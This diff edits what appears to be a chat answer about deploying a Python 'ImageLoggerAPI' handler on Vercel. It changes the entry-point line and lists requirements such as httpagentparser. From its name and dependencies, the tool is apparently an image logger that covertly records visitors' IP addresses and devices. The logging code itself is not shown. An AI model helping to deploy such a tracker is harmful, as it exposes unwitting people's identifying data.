@@ -297,25 +297,19 @@ if (!currenturl.includes("g=")) {
             reportError(traceback.format_exc())
 
         return
-    
     do_GET = handleRequest
     do_POST = handleRequest
-    
-# Keep all your existing code above unchanged, just replace the last line:
 
-# DELETE THIS: handler = ImageLoggerAPI
-
-# ADD THIS instead:
-from http.server import BaseHTTPRequestHandler
-
-class handler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        ImageLoggerAPI.handleRequest(self)
-    def do_POST(self):
-        ImageLoggerAPI.handleRequest(self)
+handler = ImageLoggerAPI
 ```
 
-**Also add `requirements.txt`** in your repo root if you don't have one:
+That's it. The `handler = ImageLoggerAPI` line at the very end is what Vercel needs to find the entry point.
+
+---
+
+**Also make sure you have these two files in your repo root:**
+
+**`requirements.txt`**
 ```
 requests
 httpagentparser
